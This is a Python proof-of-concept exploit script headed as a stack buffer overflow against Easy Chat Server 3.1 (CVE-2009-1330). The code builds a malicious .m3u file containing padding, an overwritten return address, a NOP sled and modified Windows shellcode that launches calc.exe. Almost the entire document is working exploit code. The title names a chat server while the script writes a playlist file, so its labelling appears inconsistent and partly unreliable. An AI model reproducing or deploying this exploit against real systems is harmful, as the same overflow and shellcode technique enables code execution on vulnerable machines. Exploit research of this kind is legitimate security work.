# PoC Exploit Title: Easy Chat Server 3.1 Stack Buffer Overflow (SEH)
# Author: Cosmo
# Vulnerability Type: User mode write stack buffer overflow
# Tested on: [Windows XP, 7, 8, Windows 10][DEP Disabled]
# Date: 02/08/2019
# (Fixed) Shellcode: calc: https://idafchev.github.io/exploit/2017/09/26/writing_windows_shellcode.html#test_shellcode
# CVE: CVE-2009-1330

import string, sys
from struct import pack

filename = "expl.m3u"
buffer = b'A'* 10000
buffer += b'B' * 10000
buffer += b'C' * 5000
buffer += b'D' * 500
buffer += b'E' * 500
buffer += b"F" * 50
buffer += pack("<L",0x6F4F3E71) # EIP jmp to shellcode
buffer += b'G' * 4
buffer += b'\x90\x90\x90\x90'*200   # ESP
buffer +=  (b"\x50\x53\x51\x52\x56\x57\x55\x89"
			b"\xe5\x83\xec\x18\x31\xf6\x56\x6a"
			b"\x63\x66\x68\x78\x65\x68\x57\x69"
			b"\x6e\x45\x89\x65\xfc\x31\xf6\x64"
			b"\x8b\x5e\x30\x8b\x5b\x0c\x8b\x5b"
			b"\x14\x8b\x1b\x8b\x1b\x8b\x5b\x10"
			b"\x89\x5d\xf8\x31\xc0\x8b\x43\x3c"
			b"\x01\xd8\x8b\x40\x78\x01\xd8\x8b"
			b"\x48\x24\x01\xd9\x89\x4d\xf4"
            b"\x31\xFF\x6A\x10\x5F\x83\xC7\x10\x8B\x3C\x38\x01\xdf\x89\x7d\xf0\x8b"   # Had to adjust the shellcode: \x8b\x78\x20 mov edi eax+0x20 (0x20 = bad) caused networking issuess
			b"\x50\x1c\x01\xda\x89\x55\xec\x8b"
			b"\x58\x14\x31\xc0\x8b\x55\xf8\x8b"
			b"\x7d\xf0\x8b\x75\xfc\x31\xc9\xfc"
			b"\x8b\x3c\x87\x01\xd7\x66\x83\xc1"
			b"\x08\xf3\xa6"                        # Original shellcode made a jump 0A bytes, adjusted to 0B with nop
            b"\x74\x0b\x90"
            b"\x40\x39\xd8"
			b"\x72\xe4\x83\xc4\x26\xeb\x44\x8b"
			b"\x4d\xf4\x89\xd3\x8b\x55\xec\x66"    # Adapted relative jumps below new nop
			b"\x8b\x04\x41\x8b\x04\x82\x01\xd8"
			b"\x31\xd2\x52\x68\x2e\x65\x78\x65"
			b"\x68\x63\x61\x6c\x63\x68\x6d\x33"
			b"\x32\x5c\x68\x79\x73\x74\x65\x68"
			b"\x77\x73\x5c\x53\x68\x69\x6e\x64"
			b"\x6f\x68\x43\x3a\x5c\x57\x89\xe6"
			b"\x6A\x09\x5A\x42\x52"                # Original shellcode contained 0A Byte aka Linefeed
            b"\x5B\x43\x53"
            b"\x56\xff\xd0\x83\xc4\x46"
			b"\x5d\x5f\x5e\x5a\x59\x5b\x58\xc3")



print("Creating file ..")
with open(filename, 'w+b') as file:
    file.write(buffer)
    file.close()
print(".. file {} written.".format(filename))

